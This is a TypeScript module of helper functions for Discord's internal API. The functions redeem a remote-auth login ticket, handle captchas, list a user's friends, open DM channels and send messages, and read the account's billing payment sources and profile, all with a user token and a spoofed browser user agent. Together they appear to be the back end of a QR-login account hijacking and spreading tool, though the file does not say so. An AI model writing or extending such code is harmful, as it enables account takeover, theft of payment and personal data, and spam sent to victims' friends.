import fetch from "node-fetch";
import axios, { AxiosError } from "axios";
import { IFriend, IFullUserInfo } from "../../interfaces/IDiscord";

const USER_AGENT =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0";

export const getTicketAxios = async (ticket: string) =>
  axios
    .post(
      "https://discord.com/api/v9/users/@me/remote-auth/login",
      {
        ticket,
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    )
    .then((res) => res.data)
    .catch((_: AxiosError) => _.response?.data);

export const getTicketWithCaptchaAxios = async (
  ticket: string,
  captcha_key: string,
  captcha_rqtoken: string
) =>
  axios
    .post(
      "https://discord.com/api/v9/users/@me/remote-auth/login",
      {
        ticket,
        captcha_key,
        captcha_rqtoken,
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    )
    .then((res) => res.data)
    .catch((_: AxiosError) => _.response?.data);

export const getUserFriendsAxios = async (token: string): Promise<IFriend[]> =>
  axios
    .get("https://discord.com/api/v9/users/@me/relationships", {
      headers: {
        Authorization: token,
        "User-Agent": USER_AGENT,
      },
    })
    .then((res) => res.data)
    .catch((_: AxiosError) => _.response?.data);

export const createFriendChannelAxios = async (
  token: string,
  friendId: string
) =>
  axios
    .post(
      `https://discord.com/api/v9/users/@me/channels`,
      {
        recipients: [friendId],
      },
      {
        headers: {
          "Content-type": "application/json; charset=UTF-8",
          "User-Agent": USER_AGENT,
          Authorization: token,
        },
      }
    )
    .then((res) => res.data)
    .catch((_: AxiosError) => _.response?.data);

export const sendMessageAxios = async (
  token: string,
  channelId: string,
  message: string
) =>
  axios
    .post(
      `https://discord.com/api/v9/channels/${channelId}/messages`,
      {
        content: message,
      },
      {
        headers: {
          "Content-type": "application/json; charset=UTF-8",
          "User-Agent": USER_AGENT,
          Authorization: token,
        },
      }
    )
    .then((res) => res.data)
    .catch((_: AxiosError) => _.response?.data);

export const sendMessageWithCaptchaAxios = async (
  token: string,
  channelId: string,
  message: string,
  captcha_key: string,
  captcha_rqtoken: string
) =>
  axios
    .post(
      `https://discord.com/api/v9/channels/${channelId}/messages`,
      {
        content: message,
        captcha_key,
        captcha_rqtoken,
      },
      {
        headers: {
          "Content-type": "application/json; charset=UTF-8",
          "User-Agent": USER_AGENT,
          Authorization: token,
        },
      }
    )
    .then((res) => res.data)
    .catch((_: AxiosError) => _.response?.data);

export const getBillingInforationAxios = async (token: string) =>
  axios
    .get(`https://discord.com/api/v9/users/@me/billing/payment-sources`, {
      headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
      },
    })
    .then((res) => res.data)
    .catch((_) => {});

export const getUserInformationAxios = async (
  token: string
): Promise<IFullUserInfo> =>
  axios
    .get(`https://discord.com/api/v9/users/@me`, {
      headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT,
        Authorization: token,
      },
    })
    .then((res) => res.data)
    .catch((_: AxiosError) => _.response?.data);